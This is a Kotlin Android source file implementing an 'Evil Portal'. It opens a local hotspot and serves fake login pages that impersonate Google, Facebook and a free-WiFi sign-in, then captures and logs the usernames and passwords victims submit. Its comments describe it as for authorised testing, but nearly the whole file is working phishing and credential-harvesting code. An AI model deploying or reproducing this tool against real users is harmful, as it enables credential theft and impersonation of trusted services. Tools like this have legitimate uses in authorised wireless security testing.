package com.example.flipperdroid.viewmodel

import android.annotation.SuppressLint
import android.content.Context
import android.net.wifi.WifiManager
import android.os.Build
import androidx.lifecycle.ViewModel
import com.example.flipperdroid.util.AppLog
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.ServerSocket
import java.net.Socket
import java.net.URLDecoder

/**
 * Evil Portal / Captive Portal (test autorisé).
 *
 * Ouvre un point d'accès local (LocalOnlyHotspot) et sert une page de connexion
 * qui capture les identifiants soumis, via un petit serveur HTTP intégré.
 *
 * Limites Android : sans root on ne peut pas router le trafic ni écouter sur le
 * port 80, donc la popup captive automatique n'est pas garantie — les victimes
 * doivent ouvrir http://<gateway>:8080. Pas d'accès internet fourni.
 */
class EvilPortalViewModel : ViewModel() {

    @SuppressLint("StaticFieldLeak")
    private var context: Context? = null
    private var wifiManager: WifiManager? = null
    private var reservation: WifiManager.LocalOnlyHotspotReservation? = null
    private var serverSocket: ServerSocket? = null
    private var serverThread: Thread? = null
    @Volatile private var running = false

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning

    private val _ssid = MutableStateFlow("")
    val ssid: StateFlow<String> = _ssid

    private val _password = MutableStateFlow("")
    val password: StateFlow<String> = _password

    private val _status = MutableStateFlow("")
    val status: StateFlow<String> = _status

    private val _captured = MutableStateFlow<List<String>>(emptyList())
    val captured: StateFlow<List<String>> = _captured

    // Titre affiché sur la page de phishing (personnalisable)
    var portalTitle = "Free WiFi — Sign in"

    /** Modèles de page captive (test autorisé uniquement). */
    enum class PortalTemplate { GENERIC, GOOGLE, FACEBOOK, FREE_WIFI }
    private val _template = MutableStateFlow(PortalTemplate.GENERIC)
    val template: StateFlow<PortalTemplate> = _template
    fun setTemplate(t: PortalTemplate) { _template.value = t }

    // Nombre de requêtes HTTP reçues (retour visuel « ça marche »).
    private val _requests = MutableStateFlow(0)
    val requests: StateFlow<Int> = _requests

    fun initialize(context: Context) {
        this.context = context.applicationContext
        wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
    }

    @SuppressLint("MissingPermission")
    fun start() {
        if (_isRunning.value) return
        startHttpServer()
        try {
            wifiManager?.startLocalOnlyHotspot(object : WifiManager.LocalOnlyHotspotCallback() {
                override fun onStarted(res: WifiManager.LocalOnlyHotspotReservation) {
                    reservation = res
                    extractCredentials(res)
                    _isRunning.value = true
                    _status.value = "Hotspot up. A connected client must open http://192.168.49.1:8080 " +
                        "in a browser (no auto captive pop-up without root). Watch Logs for incoming requests."
                    AppLog.log("EvilPortal", "Hotspot started SSID=${_ssid.value}")
                }
                override fun onFailed(reason: Int) {
                    _status.value = "Hotspot failed (reason $reason). Needs location on + Wi-Fi available."
                    stopServer()
                }
            }, null)
        } catch (e: Exception) {
            _status.value = "Hotspot error: ${e.message}"
            stopServer()
        }
    }

    fun stop() {
        stopServer()
        try { reservation?.close() } catch (_: Exception) {}
        reservation = null
        _isRunning.value = false
        _status.value = "Stopped."
        AppLog.log("EvilPortal", "Stopped")
    }

    private fun extractCredentials(res: WifiManager.LocalOnlyHotspotReservation) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                val c = res.softApConfiguration
                _ssid.value = c.ssid ?: "?"
                _password.value = c.passphrase ?: "(open)"
            } else {
                @Suppress("DEPRECATION")
                val wc = res.wifiConfiguration
                _ssid.value = wc?.SSID ?: "?"
                @Suppress("DEPRECATION")
                _password.value = wc?.preSharedKey ?: "(open)"
            }
        } catch (e: Exception) {
            _ssid.value = "?"; _password.value = "?"
        }
    }

    private fun startHttpServer() {
        running = true
        serverThread = Thread {
            try {
                serverSocket = ServerSocket(8080)
                while (running) {
                    val client = try { serverSocket!!.accept() } catch (e: Exception) { break }
                    try { handleClient(client) } catch (_: Exception) {}
                }
            } catch (e: Exception) {
                _status.value = "Server error: ${e.message}"
            }
        }.apply { start() }
    }

    private fun stopServer() {
        running = false
        try { serverSocket?.close() } catch (_: Exception) {}
        serverSocket = null
        serverThread = null
    }

    private fun handleClient(client: Socket) {
        val reader = BufferedReader(InputStreamReader(client.getInputStream()))
        val requestLine = reader.readLine() ?: run { client.close(); return }
        // Trace chaque requête : permet de vérifier qu'un client atteint bien le portail.
        AppLog.log("EvilPortal", "Request from ${client.inetAddress?.hostAddress ?: "?"}: $requestLine")
        _requests.value = _requests.value + 1
        val method = requestLine.substringBefore(" ")
        var contentLength = 0
        var line: String?
        while (reader.readLine().also { line = it } != null && !line.isNullOrEmpty()) {
            if (line!!.startsWith("Content-Length:", true)) {
                contentLength = line!!.substringAfter(":").trim().toIntOrNull() ?: 0
            }
        }
        if (method.equals("POST", true) && contentLength > 0) {
            val body = CharArray(contentLength)
            var read = 0
            while (read < contentLength) {
                val r = reader.read(body, read, contentLength - read)
                if (r < 0) break
                read += r
            }
            captureCredentials(String(body, 0, read))
        }

        val html = portalHtml()
        val bytes = html.toByteArray(Charsets.UTF_8)
        val out = client.getOutputStream()
        out.write(("HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n" +
                "Connection: close\r\nContent-Length: ${bytes.size}\r\n\r\n").toByteArray())
        out.write(bytes)
        out.flush()
        client.close()
    }

    private fun captureCredentials(body: String) {
        val fields = body.split("&").associate {
            val kv = it.split("=", limit = 2)
            val k = URLDecoder.decode(kv.getOrElse(0) { "" }, "UTF-8")
            val v = URLDecoder.decode(kv.getOrElse(1) { "" }, "UTF-8")
            k to v
        }
        val user = fields["username"] ?: fields["email"] ?: fields["user"] ?: "?"
        val pass = fields["password"] ?: fields["pass"] ?: "?"
        val entry = "user=$user  pass=$pass"
        _captured.value = _captured.value + entry
        AppLog.log("EvilPortal", "Captured $entry")
    }

    private fun portalHtml(): String = when (_template.value) {
        PortalTemplate.GOOGLE -> loginPage(
            title = "Sign in - Google Accounts", heading = "Sign in",
            sub = "Use your Google Account", userField = "email",
            userLabel = "Email or phone", accent = "#1a73e8", bg = "#ffffff"
        )
        PortalTemplate.FACEBOOK -> loginPage(
            title = "Log in to Facebook", heading = "facebook",
            sub = "Log in to continue", userField = "email",
            userLabel = "Email address or phone number", accent = "#1877f2", bg = "#f0f2f5"
        )
        PortalTemplate.FREE_WIFI -> loginPage(
            title = "Free WiFi — Sign in", heading = "Free WiFi",
            sub = "Sign in to access the internet", userField = "username",
            userLabel = "Email or username", accent = "#00a0a0", bg = "#f0f2f5"
        )
        PortalTemplate.GENERIC -> loginPage(
            title = portalTitle, heading = portalTitle,
            sub = "Please sign in to continue", userField = "username",
            userLabel = "Email or username", accent = "#1877f2", bg = "#f0f2f5"
        )
    }

    /** Gabarit de page de connexion. Champs nommés email/username + password (capturés). */
    private fun loginPage(
        title: String, heading: String, sub: String,
        userField: String, userLabel: String, accent: String, bg: String
    ): String = """
        <!doctype html><html><head><meta name=viewport content="width=device-width,initial-scale=1">
        <title>$title</title>
        <style>body{font-family:Arial,Helvetica,sans-serif;background:$bg;display:flex;justify-content:center;padding-top:50px;margin:0}
        .c{background:#fff;padding:28px;border-radius:10px;box-shadow:0 2px 10px #0002;width:320px}
        h2{margin:0 0 4px;text-align:center;color:$accent}
        p.s{margin:0 0 16px;text-align:center;color:#555;font-size:14px}
        input{width:100%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:6px}
        button{width:100%;padding:12px;background:$accent;color:#fff;border:0;border-radius:6px;font-size:16px;margin-top:8px}</style>
        </head><body><div class=c><h2>$heading</h2><p class=s>$sub</p>
        <form method=post action="/login">
        <input name=$userField placeholder="$userLabel" autofocus>
        <input name=password type=password placeholder="Password">
        <button type=submit>Sign in</button></form></div></body></html>
    """.trimIndent()

    override fun onCleared() {
        super.onCleared()
        stop()
    }
}
